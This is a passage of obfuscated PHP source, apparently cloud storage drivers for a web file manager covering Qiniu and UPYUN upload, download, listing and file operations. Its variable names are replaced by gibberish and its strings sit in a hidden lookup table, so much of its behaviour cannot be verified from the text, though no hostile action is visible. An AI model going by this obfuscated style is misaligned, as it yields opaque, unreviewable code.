array(); if (is_array($í©ˆíâì)) { foreach ($í©ˆíâì as $‚ì²ªŸñ) { $™ùú“¹ [] = $this->link($‚ì²ªŸñ); } } else { $™ùú“¹ [] = $this->link($í©ˆíâì); } $»ñŸâîğ = new Qiniu\Cdn\CdnManager($this->auth); list($âÚÔãç¯, $„µõù•) = $»ñŸâîğ->refreshUrls($™ùú“¹ ); if ($„µõù•) { return !1; } return $âÚÔãç¯[$…‡Äù´‘[1284]] == $…‡Äù´‘[850] ? !0 : !1; } public function fileSubstr($ê˜™×¯Â, $¬õğ÷’, $¥’ùœ‘š) { $¢âÔ‹ÓÅ =& $_SERVER[É¨™èà]; if (!($©¿Œ¹Ë‹ = $this->link($ê˜™×¯Â))) { return !1; } $ÖÁÌØìì = !1; if ($¥’ùœ‘š > 0) { $ú…Áß¯’ = $¬õğ÷’ + $¥’ùœ‘š - 1; $ÖÁÌØìì = array($¢âÔ‹ÓÅ[1563] . $¬õğ÷’ . $¢âÔ‹ÓÅ[472] . $ú…Áß¯’); } $¦û…˜²… = url_request($©¿Œ¹Ë‹, $¢âÔ‹ÓÅ[1524], !1, $ÖÁÌØìì); return $¦û…˜²…[$¢âÔ‹ÓÅ[840]] ? $¦û…˜²…[$¢âÔ‹ÓÅ[1307]] : !1; } public function upload($ş¬çÉ™, $×½‚ûëœ, $ëÃ¹µÀÉ = false, $ß¼‚¢·æ = REPEAT_REPLACE) { $ä¢Ş² = new Qiniu\Storage\UploadManager(); $àÉ†× = $this->auth->uploadToken($this->bucket, $ş¬çÉ™); $íàÍ×äÅ = get_file_mime(get_path_ext($×½‚ûëœ)); list($ÑÁ¥òÕƒ, $ö°íÑÒ¯) = $ä¢Ş²->putFile($àÉ†×, $ş¬çÉ™, $×½‚ûëœ, null, $íàÍ×äÅ); return $ö°íÑÒ¯ ? !1 : $this->getPathOuter($ş¬çÉ™); } public function uploadFormData($Æ’‘Å—¶, $ÍĞºş„ = 3600) { return $this->uploadToken($Æ’‘Å—¶, $ÍĞºş„); } public function uploadMultiData($¤¦ïÂ‰ , $¿²ºÑ– = 3600) { return $this->uploadToken($¤¦ïÂ‰ , $¿²ºÑ–); } private function uploadToken($å‹×»õ , $ÛæãªÀÕ = 3600) { $¡Õ÷˜şØ =& $_SERVER[É¨™èà]; $æÓ÷Õœ± = $ÛæãªÀÕ; $·ÑÜ©‡Ñ = array($¡Õ÷˜şØ[1564] => $¡Õ÷˜şØ[1565]); $²”Ø¯ = $å‹×»õ ; $Å“İÅÆ = $this->auth->uploadToken($this->bucket, $²”Ø¯, $æÓ÷Õœ±, $·ÑÜ©‡Ñ, !0); $‹Æˆ””½ = empty($this->region) || $this->region == $¡Õ÷˜şØ[1566] ? $¡Õ÷˜şØ[12] : $¡Õ÷˜şØ[472] . $this->region; $Ú¨óÊÉú = http_type() . "\72\x2f\x2f\165\x70\x6c\x6f\141\x64{$‹Æˆ””½}\x2e\161\x69\x6e\x69\x75\x70\56\143\x6f\x6d\57"; return array($¡Õ÷˜şØ[1567] => $Å“İÅÆ, $¡Õ÷˜şØ[1568] => $Ú¨óÊÉú); } public function download($•…»Ü¤, $ÃùºÄû) { $£š°©àä = IO::getPathInner(IO::mkfile($ÃùºÄû)); if (!($Ï‘ï¶ = $this->link($•…»Ü¤))) { return !1; } $ŞÛº«İ = 0; $úãğµ– = 1024 * 200; $Š®Œ½ı = fopen($£š°©àä, $_SERVER[É¨™èà][1569]); while (!0) { $‘ïšÅé× = $this->fileSubstr($•…»Ü¤, $ŞÛº«İ, $úãğµ–); if ($‘ïšÅé× === !1) { return !1; } fwrite($Š®Œ½ı, $‘ïšÅé×); $ŞÛº«İ += $úãğµ–; if (strlen($‘ïšÅé×) < $úãğµ–) { break; } } fclose($Š®Œ½ı); return $ÃùºÄû; } public function link($àœŞÍ…‰, $Å¬³†û = '') { if (!$this->isFile($àœŞÍ…‰)) { return !1; } $«¹¯è¶³ = $this->getHost() . $_SERVER[É¨™èà][8] . $this->pathEncode($àœŞÍ…‰) . $Å¬³†û; return $this->auth->privateDownloadUrl($«¹¯è¶³, 3600 * 12); } public function fileOut($ÈÙöìŠ£, $æ®±«¢Ñ = false, $¡íĞèäÚ = false, $› ÄÍŞõ = '') { $–ÀÑÇ³ç =& $_SERVER[É¨™èà]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÈÙöìŠ£, $æ®±«¢Ñ, $¡íĞèäÚ, $› ÄÍŞõ); } if (!$¡íĞèäÚ) { $¡íĞèäÚ = $this->pathThis($ÈÙöìŠ£); } $ßòö¨ã‘ = $æ®±«¢Ñ ? $–ÀÑÇ³ç[1570] . rawurlencode($¡íĞèäÚ) : $–ÀÑÇ³ç[12]; $Ôˆ…ˆîõ = $this->link($ÈÙöìŠ£, $ßòö¨ã‘); $this->fileOutLink($Ôˆ…ˆîõ); } public function fileOutServer($‰„Éü¾, $³øÄŸ¡ = false, $Áå²–¯£ = false, $ûÓ¬ùµÍ = '') { parent::fileOut($‰„Éü¾, $³øÄŸ¡, $Áå²–¯£, $ûÓ¬ùµÍ); } public function fileOutImage($ëº¾à¨½, $Ë²şĞš® = 250) { if ($this->size($ëº¾à¨½) > 1024 * 1024 * 20) { return $this->fileOutImageServer($ëº¾à¨½, $Ë²şĞš®); } $®¿Ô˜æå = $this->link($ëº¾à¨½, $_SERVER[É¨™èà][1571] . $Ë²şĞš®); $this->fileOutLink($®¿Ô˜æå); } public function fileOutImageServer($šíÚÉ©, $ì£ú¬„‹ = 250) { parent::fileOutImage($šíÚÉ©, $ì£ú¬„‹); } public function hashMd5($ìˆÂÏáó) { $„©²ÎÉÑ =& $_SERVER[É¨™èà]; $¿¦§À½§ = $this->objectMeta($ìˆÂÏáó); return isset($¿¦§À½§[$„©²ÎÉÑ[248]]) ? $¿¦§À½§[$„©²ÎÉÑ[248]] : !1; $«ÛƒË€æ = $this->link($ìˆÂÏáó, $„©²ÎÉÑ[1572]); } public function size($™»Ã¹½) { $ÅÅ˜ß²Û = $this->objectMeta($™»Ã¹½); return $ÅÅ˜ß²Û ? $ÅÅ˜ß²Û[$_SERVER[É¨™èà][79]] : 0; } public function info($˜åşÜğ«) { if ($this->isFolder($˜åşÜğ«)) { return $this->folderInfo($˜åşÜğ«); } else { if ($this->isFile($˜åşÜğ«)) { return $this->fileInfo($˜åşÜğ«); } } return !1; } public function exist($º²ü€šØ) { return $this->isFile($º²ü€šØ) || $this->isFolder($º²ü€šØ); } public function isFile($Ÿ—²¥À) { return !$this->isFolder($Ÿ—²¥À) && $this->objectMeta($Ÿ—²¥À); } public function isFolder($…÷êù‹­) { return $this->cacheMethod($_SERVER[É¨™èà][180], $…÷êù‹­); } protected function objectMeta($©¨êï©¹) { return $this->cacheMethod($_SERVER[É¨™èà][182], $©¨êï©¹); } protected function _objectMeta($Ò®Ä´©À) { $¸Ó¨¾Æˆ =& $_SERVER[É¨™èà]; list($‚§¡š§, $š«§»ËÄ) = $this->bucketManager->stat($this->bucket, $Ò®Ä´©À); if ($‚§¡š§) { $‚§¡š§[$¸Ó¨¾Æˆ[79]] = intval($‚§¡š§[$¸Ó¨¾Æˆ[1558]]); } return $‚§¡š§; } protected function _isFolder($Ü·ùˆ×©) { $İù×„şî =& $_SERVER[É¨™èà]; if ($Ü·ùˆ×© == $İù×„şî[12] || $Ü·ùˆ×© == $İù×„şî[8]) { return !0; } list($ñàıÇÂÊ, $™†£ğ¦) = $this->bucketManager->listFiles($this->bucket, trim($Ü·ùˆ×©, $İù×„şî[8]) . $İù×„şî[8], $İù×„şî[12], 1, $İù×„şî[8]); return !empty($ñàıÇÂÊ[$İù×„şî[1561]]) || !empty($ñàıÇÂÊ[$İù×„şî[1562]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‰è”Èé‡, $Ğé©å—Ğ = 0) { parent::__construct(); $this->source = $‰è”Èé‡; $this->sourceSize = $Ğé©å—Ğ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÓÀö³Ó£ = false) { return $this->sourceSize; } public function getContent($öıÊµÃŒ = false) { return $this->fileSubstr($öıÊµÃŒ, 0, $this->sourceSize); } public function fileSubstr($¼¬¿Á = false, $ÊÂø†ö = 0, $Ú‰æššù = 0) { if (!$Ú‰æššù) { $Ú‰æššù = $this->sourceSize; } $ÛÅÃ¼²Û = $this->sourceSize - $ÊÂø†ö; if ($Ú‰æššù >= $ÛÅÃ¼²Û) { $Ú‰æššù = $ÛÅÃ¼²Û; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ÊÂø†ö, $Ú‰æššù); } if ($this->sourceType == self::TYPE_FILE) { if ($Ú‰æššù <= 0) { return $_SERVER[É¨™èà][12]; } $÷¾•ªƒ = ftell($this->source); fseek_64($this->source, $÷¾•ªƒ + $ÊÂø†ö); $ô…úß˜ = @fread($this->source, $Ú‰æššù); fseek_64($this->source, $÷¾•ªƒ); return $ô…úß˜; } } public function hashMd5($¬Ìá³¿ç = false) { return md5($this->getContent()); } public static function hash($œÑ½›Œ˜, $º® çª¥ = 0) { $¸¦—¯Ã¸ = new PathDriverStream($œÑ½›Œ˜, $º® çª¥); return $¸¦—¯Ã¸->hashSimple($œÑ½›Œ˜); } public static function md5($ö‚â¨éİ, $ÍÛÅŠ” = 0) { $ØĞ¦Ææ = new PathDriverStream($ö‚â¨éİ, $ÍÛÅŠ”); return $ØĞ¦Ææ->hashMd5($ö‚â¨éİ); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\x76\x30\56\x61\160\151\56\165\x70\x79\165\156\x2e\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($Æ‚µªº¿) { parent::__construct(); $this->_init($Æ‚µªº¿); } public function _init($úŸ¾Ş¾˜) { $ù… ¥Ù =& $_SERVER[É¨™èà]; foreach ($úŸ¾Ş¾˜ as $òßÀ”Ëª => $Èö”ˆ£ê) { if (isset($this->{$òßÀ”Ëª})) { $this->{$òßÀ”Ëª} = $Èö”ˆ£ê; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ù… ¥Ù[1573] . LNG($ù… ¥Ù[1493])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($¶­Í¶, $ŸËÚı¾ß = "\107\x45\124") { $¦ÕŸÆ÷Ë =& $_SERVER[É¨™èà]; $Ê¾š®É« = gmdate($¦ÕŸÆ÷Ë[1522]); $ô—Üé‹ = base64_encode(hash_hmac($¦ÕŸÆ÷Ë[1574], "{$ŸËÚı¾ß}\x26{$¶­Í¶}\46{$Ê¾š®É«}", md5("{$this->userpass}"), !0)); $ğòàß÷¹ = array("\101\165\x74\x68\157\x72\151\172\141\164\x69\157\156\72\125\x50\x59\125\116\40{$this->username}\x3a{$ô—Üé‹}", "\104\141\164\145\72{$Ê¾š®É«}"); return $ğòàß÷¹; } public function ussRequest($ÄöÉı±Ğ, $Í‰”À‡Ğ = "\107\x45\x54", $ò‰Ùµ¨ = false, $Š¹¾Ñ¸ = false, $Ôİ¦ñÜĞ = false) { $±–ÂéÂÜ =& $_SERVER[É¨™èà]; $ÄöÉı±Ğ = trim($ÄöÉı±Ğ, $±–ÂéÂÜ[8]); $×È‚³Ê² = "\x2f{$this->bucket}\x2f" . rawurlencode($ÄöÉı±Ğ); $ÃÆî¢¿ = $this->ussHeaders($×È‚³Ê², $Í‰”À‡Ğ); if ($Š¹¾Ñ¸) { $ÃÆî¢¿ = array_merge($ÃÆî¢¿, $Š¹¾Ñ¸); } $ ¿´£¤Ø = url_request($this->endpoint . $×È‚³Ê², $Í‰”À‡Ğ, $ò‰Ùµ¨, $ÃÆî¢¿, $Ôİ¦ñÜĞ); if (!$ ¿´£¤Ø) { $øé•ôÛË = LNG($±–ÂéÂÜ[1575]); $this->writeLog($øé•ôÛË); return array($±–ÂéÂÜ[1317] => !1, $±–ÂéÂÜ[1307] => $øé•ôÛË); } if (strtolower($Í‰”À‡Ğ) == $±–ÂéÂÜ[230] || in_array($ ¿´£¤Ø[$±–ÂéÂÜ[1317]], array($±–ÂéÂÜ[264], $±–ÂéÂÜ[1576]))) { $ò‰Ùµ¨ = $ ¿´£¤Ø[$±–ÂéÂÜ[1577]]; if (!$ ¿´£¤Ø[$±–ÂéÂÜ[840]]) { $ò‰Ùµ¨ = isset($ò‰Ùµ¨[0]) ? $ò‰Ùµ¨[0] : $±–ÂéÂÜ[12]; } } else { $ò‰Ùµ¨ = json_decode($ ¿´£¤Ø[$±–ÂéÂÜ[1307]], !0); if (!$ò‰Ùµ¨) { $ò‰Ùµ¨ = $ ¿´£¤Ø[$±–ÂéÂÜ[1307]]; } else { if (!$ ¿´£¤Ø[$±–ÂéÂÜ[840]] && isset($ò‰Ùµ¨[$±–ÂéÂÜ[1578]])) { $ò‰Ùµ¨ = $ò‰Ùµ¨[$±–ÂéÂÜ[1578]]; } } } if (!$ ¿´£¤Ø[$±–ÂéÂÜ[840]]) { $this->writeLog($this->__errorMessage($ò‰Ùµ¨)); } return array($±–ÂéÂÜ[1317] => $ ¿´£¤Ø[$±–ÂéÂÜ[840]], $±–ÂéÂÜ[1307] => $ò‰Ùµ¨); } private function __errorMessage($Ì÷˜óëì) { $è¡ÒæâÏ =& $_SERVER[É¨™èà]; if (!$Ì÷˜óëì) { return $è¡ÒæâÏ[12]; } static $ŠóÜöÒî = null; if (!$ŠóÜöÒî) { $ŠóÜöÒî = I18n::getType(); } if ($ŠóÜöÒî != $è¡ÒæâÏ[1531]) { return $Ì÷˜óëì; } $áÃçä¸ß = array($è¡ÒæâÏ[1579] => $è¡ÒæâÏ[1580], $è¡ÒæâÏ[1581] => $è¡ÒæâÏ[1582], $è¡ÒæâÏ[1583] => $è¡ÒæâÏ[1582], $è¡ÒæâÏ[1584] => $è¡ÒæâÏ[1585], $è¡ÒæâÏ[1586] => $è¡ÒæâÏ[1587], $è¡ÒæâÏ[1588] => $è¡ÒæâÏ[1589], $è¡ÒæâÏ[1590] => $è¡ÒæâÏ[1591]); return isset($áÃçä¸ß[$Ì÷˜óëì]) ? $áÃçä¸ß[$Ì÷˜óëì] : $Ì÷˜óëì; } public function mkfile($ÛóÎÃŒ, $Ä£îËÖä = '', $¯éÎĞ = REPEAT_RENAME) { if ($this->setContent($ÛóÎÃŒ, $Ä£îËÖä)) { return $this->getPathOuter($ÛóÎÃŒ); } return !1; } public function mkdir($ÄâØ¿ñ¾, $ÇÍ¿”†¶ = REPEAT_SKIP) { $”¸´•›Ì =& $_SERVER[É¨™èà]; $Øèîç†¢ = trim($ÄâØ¿ñ¾, $”¸´•›Ì[8]); if ($this->_isFolder($Øèîç†¢)) { return $this->getPathOuter($Øèîç†¢); } $ñ´¢¦‚ë = array($”¸´•›Ì[1592]); $Ğà øüñ = $this->ussRequest($Øèîç†¢, $”¸´•›Ì[291], !1, $ñ´¢¦‚ë); return $Ğà øüñ[$”¸´•›Ì[1317]] ? $this->getPathOuter($Øèîç†¢) : !1; } public function copyFile($ƒ”Ë§ë, $ÖÑ±°Ï¢) { $§ğ…ÓßÛ =& $_SERVER[É¨™èà]; $µ¹ìô³ = array($§ğ…ÓßÛ[1593] . "\57{$this->bucket}\57{$ƒ”Ë§ë}", $§ğ…ÓßÛ[1594]); $ËÔ‚ = $this->ussRequest($ÖÑ±°Ï¢, $§ğ…ÓßÛ[256], !1, $µ¹ìô³); return $ËÔ‚[$§ğ…ÓßÛ[1317]] ? !0 : $this->getPathOuter($ÖÑ±°Ï¢); } public function moveFile($ÓÏË„€š, $¶¡º˜üŠ) { $Ôä˜ƒ‚ =& $_SERVER[É¨™èà]; $¿ì’Îä× = array($Ôä˜ƒ‚[1595] . "\x2f{$this->bucket}\57{$ÓÏË„€š}", $Ôä˜ƒ‚[1594]); $ŒË»àã = $this->ussRequest($¶¡º˜üŠ, $Ôä˜ƒ‚[256], !1, $¿ì’Îä×); return $ŒË»àã[$Ôä˜ƒ‚[1317]] ? !0 : $this->getPathOuter($¶¡º˜üŠ); } public function delFile($Ÿ¼™Ş©É) { $õ„âĞ´­ =& $_SERVER[É¨™èà]; $Óôœşø€ = $this->ussRequest($Ÿ¼™Ş©É, $õ„âĞ´­[1596]); return $Óôœşø€[$õ„âĞ´­[1317]] ? !0 : !1; } public function delFolder($£â­ëÛƒ) { $—×¿–İ =& $_SERVER[É¨™èà]; if (!$this->exist($£â­ëÛƒ)) { return !0; } $this->listItemCache = !1; $Ü™†º¹ = $ƒİÇÔ½– = array(); $this->fileList($£â­ëÛƒ, $Ü™†º¹, $ƒİÇÔ½–, !0); $this->listItemCache = !0; foreach ($ƒİÇÔ½– as $¬¯ŒàŸİ) { $¤°ĞÂÈ¾ = $this->ussRequest($¬¯ŒàŸİ[$—×¿–İ[32]], $—×¿–İ[1596]); if (!$¤°ĞÂÈ¾[$—×¿–İ[1317]]) { return !1; } } usort($Ü™†º¹, function ($³„úı‹, $¥—³ìÇü) { $êÌ•†ïü =& $_SERVER[É¨™èà]; return substr_count($¥—³ìÇü, $êÌ•†ïü[8]) - substr_count($³„úı‹, $êÌ•†ïü[8]); }); foreach ($Ü™†º¹ as $Œè£íôä) { $¤°ĞÂÈ¾ = $this->ussRequest($Œè£íôä, $—×¿–İ[1596]); if (!$¤°ĞÂÈ¾[$—×¿–İ[1317]]) { return !1; } } $¤°ĞÂÈ¾ = $this->ussRequest($£â­ëÛƒ, $—×¿–İ[1596]); return $¤°ĞÂÈ¾[$—×¿–İ[1317]]; } public function rename($Ö·×²µƒ, $ÒÏÆığç) { if ($this->isFile($Ö·×²µƒ)) { $ÒÏÆığç = get_path_father($Ö·×²µƒ) . $ÒÏÆığç; return $this->moveFile($Ö·×²µƒ, $ÒÏÆığç); } return $this->renameObject($Ö·×²µƒ, $ÒÏÆığç); } public function fileInfo($úœÀùÆÛ, $Ì½Ì˜À¯ = false, $ÃûÜÛ©Ã = array()) { $“©°çªÏ =& $_SERVER[É¨™èà]; $ã£ÖÌÜÕ = array($“©°çªÏ[32] => $this->pathThis($úœÀùÆÛ), $“©°çªÏ[87] => $this->getPathOuter($“©°çªÏ[8] . $úœÀùÆÛ), $“©°çªÏ[33] => $“©°çªÏ[233], $“©°çªÏ[79] => isset($ÃûÜÛ©Ã[$“©°çªÏ[79]]) ? $ÃûÜÛ©Ã[$“©°çªÏ[79]] : 0, $“©°çªÏ[169] => $this->ext($úœÀùÆÛ)); if ($Ì½Ì˜À¯) { return $ã£ÖÌÜÕ; } $ã£ÖÌÜÕ[$“©°çªÏ[234]] = $ã£ÖÌÜÕ[$“©°çªÏ[88]] = 0; $ã£ÖÌÜÕ[$“©°çªÏ[235]] = $ã£ÖÌÜÕ[$“©°çªÏ[236]] = !0; if (empty($ÃûÜÛ©Ã)) { $ÃûÜÛ©Ã = $this->objectMeta($úœÀùÆÛ); if (!$ÃûÜÛ©Ã) { return $ã£ÖÌÜÕ; } } $ã£ÖÌÜÕ[$“©°çªÏ[234]] = intval($ÃûÜÛ©Ã[$“©°çªÏ[1597]]); $ã£ÖÌÜÕ[$“©°çªÏ[88]] = intval($ÃûÜÛ©Ã[$“©°çªÏ[1598]]); $ã£ÖÌÜÕ[$“©°çªÏ[79]] = $ÃûÜÛ©Ã[$“©°çªÏ[79]]; return $ã£ÖÌÜÕ; } public function folderInfo($Æ¹²‚¼õ, $ºÎµ“Ğ = false) { $Á”Õ‹ÀĞ =& $_SERVER[É¨™èà]; $­åÒæğ = array($Á”Õ‹ÀĞ[32] => $this->pathThis($Æ¹²‚¼õ), $Á”Õ‹ÀĞ[87] => $this->getPathOuter($Á”Õ‹ÀĞ[8] . $Æ¹²‚¼õ), $Á”Õ‹ÀĞ[33] => $Á”Õ‹ÀĞ[78]); if ($ºÎµ“Ğ) { return $­åÒæğ; } $­åÒæğ[$Á”Õ‹ÀĞ[234]] = $­åÒæğ[$Á”Õ‹ÀĞ[88]] = 0; $­åÒæğ[$Á”Õ‹ÀĞ[235]] = $­åÒæğ[$Á”Õ‹ÀĞ[236]] = !0; if (empty($¡îÌœ“Ñ)) { $¡îÌœ“Ñ = $this->objectMeta($Æ¹²‚¼õ); if (!$¡îÌœ“Ñ) { return $­åÒæğ; } } $­åÒæğ[$Á”Õ‹ÀĞ[234]] = intval($¡îÌœ“Ñ[$Á”Õ‹ÀĞ[1597]]); $­åÒæğ[$Á”Õ‹ÀĞ[88]] = intval($¡îÌœ“Ñ[$Á”Õ‹ÀĞ[1598]]); return $­åÒæğ; } private function listObjs($…İ‚ä§î, $Ï‹ÑÉ õ = 0, $ÆšåØªÙ = 1000) { $Ùºè´Äæ =& $_SERVER[É¨™èà]; $„ÌâÌó¬ = array($Ùºè´Äæ[1599], $Ùºè´Äæ[1600] . $ÆšåØªÙ); if ($Ï‹ÑÉ õ) { $„ÌâÌó¬[] = $Ùºè´Äæ[1601] . $Ï‹ÑÉ õ; } $¿Ì´ùÍŞ = $this->ussRequest($…İ‚ä§î, $Ùºè´Äæ[1524], !1, $„ÌâÌó¬); return !$¿Ì´ùÍŞ[$Ùºè´Äæ[1317]] ? !1 : $¿Ì´ùÍŞ[$Ùºè´Äæ[1307]]; } private function fileList($ã©ìä‚ª, &$³ÛÒ´ó—, &$ÚÃí×Ò , $†“…©íì = false) { $Öµ‘İÙ =& $_SERVER[É¨™èà]; $¾›ÓÒå = $Öµ‘İÙ[12]; $’¯Ôñè³ = 1000; $åüå¢» = rtrim($ã©ìä‚ª, $Öµ‘İÙ[8]) . $Öµ‘İÙ[8]; while (!0) { check_abort(); $Àû¯Û´» = $this->listObjs($ã©ìä‚ª, $¾›ÓÒå, $’¯Ôñè³); if (!$Àû¯Û´») { return !1; } $¾›ÓÒå = isset($Àû¯Û´»[$Öµ‘İÙ[1602]]) ? $Àû¯Û´»[$Öµ‘İÙ[1602]] : $Öµ‘İÙ[12]; $çê¢¹ä« = isset($Àû¯Û´»[$Öµ‘İÙ[1603]]) ? $Àû¯Û´»[$Öµ‘İÙ[1603]] : array(); foreach ($çê¢¹ä« as $í¿ÛÓ‹‚) { $«Ô±£©ä = $í¿ÛÓ‹‚[$Öµ‘İÙ[33]] == $Öµ‘İÙ[78] ? !0 : !1; $æÂ–÷®¸ = ltrim($åüå¢» . $í¿ÛÓ‹‚[$Öµ‘İÙ[32]], $Öµ‘İÙ[8]) . ($«Ô±£©ä ? $Öµ‘İÙ[8] : $Öµ‘İÙ[12]); $ÀŞ»”  = array($Öµ‘İÙ[32] => $æÂ–÷®¸, $Öµ‘İÙ[33] => $«Ô±£©ä ? $Öµ‘İÙ[78] : $Öµ‘İÙ[233], $Öµ‘İÙ[79] => $í¿ÛÓ‹‚[$Öµ‘İÙ[423]], $Öµ‘İÙ[1598] => $í¿ÛÓ‹‚[$Öµ‘İÙ[1604]]); $this->cacheMethodInfoSet($æÂ–÷®¸, $«Ô±£©ä, $ÀŞ»” ); if ($«Ô±£©ä) { $³ÛÒ´ó—[] = $æÂ–÷®¸; if ($†“…©íì) { $this->fileList($æÂ–÷®¸, $³ÛÒ´ó—, $ÚÃí×Ò , $†“…©íì); } continue; } $ÚÃí×Ò [] = $ÀŞ»” ; } if (count($çê¢¹ä«) < $’¯Ôñè³) { break; } } $this->cacheMethodInfoSet($ã©ìä‚ª, !0); } public function listPath($²ë„÷„», $—Ó™ë¢£ = false) { $¹Ÿ¬¢’ï =& $_SERVER[É¨™èà]; $ğû¡ôø² = $áÑÍëì’ = array(); $this->fileList($²ë„÷„», $ğû¡ôø², $áÑÍëì’); foreach ($ğû¡ôø² as $ã•´£·Š => $Ö©ì¨ÃÕ) { $ğû¡ôø²[$ã•´£·Š] = $this->folderInfo($Ö©ì¨ÃÕ, $—Ó™ë¢£); } foreach ($áÑÍëì’ as $ã•´£·Š => $Ö©ì¨ÃÕ) { $áÑÍëì’[$ã•´£·Š] = $this->fileInfo($Ö©ì¨ÃÕ[$¹Ÿ¬¢’ï[32]], $—Ó™ë¢£, $Ö©ì¨ÃÕ); } return array($¹Ÿ¬¢’ï[85] => $ğû¡ôø², $¹Ÿ¬¢’ï[86] => $áÑÍëì’); } public function has($‡è÷¯¿, $Øî´‹ì = false, $–Ú ’™‘ = true) { $¸ÅÒ¡ä´ =& $_SERVER[É¨™èà]; $şøÅ¬êÊ = $¸ÅÒ¡ä´[12]; $ÒÊèÀ¨€ = 500; $ù¦‰ËÊ = 0; $öºÇ§ĞĞ = 0; $ÖØì®òÀ = rtrim($‡è÷¯¿, $¸ÅÒ¡ä´[8]) . $¸ÅÒ¡ä´[8]; while (!0) { check_abort(); $ì®±¥şö = $this->listObjs($‡è÷¯¿, $şøÅ¬êÊ, $ÒÊèÀ¨€); if (!$ì®±¥şö) { return !1; } $şøÅ¬êÊ = isset($ì®±¥şö[$¸ÅÒ¡ä´[1602]]) ? $ì®±¥şö[$¸ÅÒ¡ä´[1602]] : $¸ÅÒ¡ä´[12]; $Õ‘°è = isset($ì®±¥şö[$¸ÅÒ¡ä´[1603]]) ? $ì®±¥şö[$¸ÅÒ¡ä´[1603]] : array(); if (empty($Õ‘°è)) { break; } $ˆ³Ÿ­çú = array_filter($Õ‘°è, function ($½£ƒëÂ‚) { $®ÙÛÍÃú =& $_SERVER[É¨™èà]; return $½£ƒëÂ‚[$®ÙÛÍÃú[33]] == $®ÙÛÍÃú[78]; }); $¬—×°Ö§ = count($Õ‘°è); $ˆ³Ÿ­çú = count($ˆ³Ÿ­çú); $›Ãïì–§ = $¬—×°Ö§ - $ˆ³Ÿ­çú; if ($Øî´‹ì) { $öºÇ§ĞĞ += $ˆ³Ÿ­çú; $ù¦‰ËÊ += $›Ãïì–§; if ($¬—×°Ö§ < $ÒÊèÀ¨€) { break; } continue; } if ($–Ú ’™‘) { if ($›Ãïì–§) { return !0; } } else { if ($ˆ³Ÿ­çú) { return !0; } } if ($¬—×°Ö§ < $ÒÊèÀ¨€) { break; } } if ($Øî´‹ì) { return array($¸ÅÒ¡ä´[242] => $ù¦‰ËÊ, $¸ÅÒ¡ä´[243] => $öºÇ§ĞĞ); } return !1; } public function listAll($¥®ÌŒ¸„) { $ßŸ‚Ï°ó =& $_SERVER[É¨™èà]; $Î¯Ê¢®ä = $ÃøµÒù… = array(); $this->fileList($¥®ÌŒ¸„, $Î¯Ê¢®ä, $ÃøµÒù…, !0); $ò¯²ößè = array_to_keyvalue($ÃøµÒù…, $ßŸ‚Ï°ó[32]); foreach ($Î¯Ê¢®ä as $‹®ç’ƒ¯) { if (is_string($‹®ç’ƒ¯)) { $ò¯²ößè[$‹®ç’ƒ¯] = array($ßŸ‚Ï°ó[79] => 0); } } return $this->listAllFiles($¥®ÌŒ¸„, $ò¯²ößè); } public function canRead($¢ä›½Ç€) { return $this->exist($¢ä›½Ç€) ? !0 : !1; } public function canWrite($¸Û·ãß) { return $this->exist($¸Û·ãß) ? !0 : !1; } public function getContent($ÏÂéâ«) { return $this->fileSubstr($ÏÂéâ«, 0, -1); } public function setContent($®ş˜í±, $µÔ‡„ïã = '') { $ó¿ø¼Ï½ =& $_SERVER[É¨™èà]; if (!$µÔ‡„ïã) { $É‡¢şÖÚ = $this->ussRequest($®ş˜í±, $ó¿ø¼Ï½[291]); return $É‡¢şÖÚ[$ó¿ø¼Ï½[1317]]; } $ñö¾¨Á = $this->tempFile($this->pathThis($®ş˜í±)); file_put_contents($ñö¾¨Á, $µÔ‡„ïã); if ($this->upload($®ş˜í±, $ñö¾¨Á)) { $this->tempFileRemve($ñö¾¨Á); return !0; } return !1; } public function fileSubstr($ƒæ±Ö‹, $Ñªà¹œ, $ªãôÊ–Ã) { $—“Ó¶à =& $_SERVER[É¨™èà]; if (!($„šš÷Æ‘ = $this->link($ƒæ±Ö‹))) { return !1; } $èù’²Ûç = !1; if ($ªãôÊ–Ã > 0) { $Â‰¸¤¨‚ = $Ñªà¹œ + $ªãôÊ–Ã - 1; $èù’²Ûç = array($—“Ó¶à[1563] . $Ñªà¹œ . $—“Ó¶à[472] . $Â‰¸¤¨‚); } $‡Š¶Êõ = url_request($„šš÷Æ‘, $—“Ó¶à[1524], !1, $èù’²Ûç); return $‡Š¶Êõ[$—“Ó¶à[840]] ? $‡Š¶Êõ[$—“Ó¶à[1307]] : !1; } public function upload($Êò¬‘ , $»›©ØÓÂ, $€¹ıÜÒ² = false, $ó…Ÿœ€ = REPEAT_REPLACE) { $±›ÚÄèÌ =& $_SERVER[É¨™èà]; $—Ôñò¾Ç = IO::size($»›©ØÓÂ); if ($—Ôñò¾Ç <= 1024 * 1024 * 200) { $ûÛ¤ôêĞ = array($±›ÚÄèÌ[1605] . $»›©ØÓÂ); $½…õÉÅã = $this->ussRequest($Êò¬‘ , $±›ÚÄèÌ[256], $ûÛ¤ôêĞ); return $½…õÉÅã[$±›ÚÄèÌ[1317]] ? $this->getPathOuter($Êò¬‘ ) : !1; } $àÚÕ’ô = 1024 * 1024 * 10; $Û Æáì® = array($±›ÚÄèÌ[1606], $±›ÚÄèÌ[1607] . $—Ôñò¾Ç, $±›ÚÄèÌ[1608], $±›ÚÄèÌ[1609] . $àÚÕ’ô); $½…õÉÅã = $this->ussRequest($Êò¬‘ , $±›ÚÄèÌ[256], !1, $Û Æáì®); if (!$½…õÉÅã[$±›ÚÄèÌ[1317]]) { return !1; } $…ªîñ¤ = $½…õÉÅã[$±›ÚÄèÌ[1307]]; $çĞ¸³…â = 0; $‹ş‰æÎÎ = $…ªîñ¤[$±›ÚÄèÌ[1610]]; $æ„üš¿Ÿ = 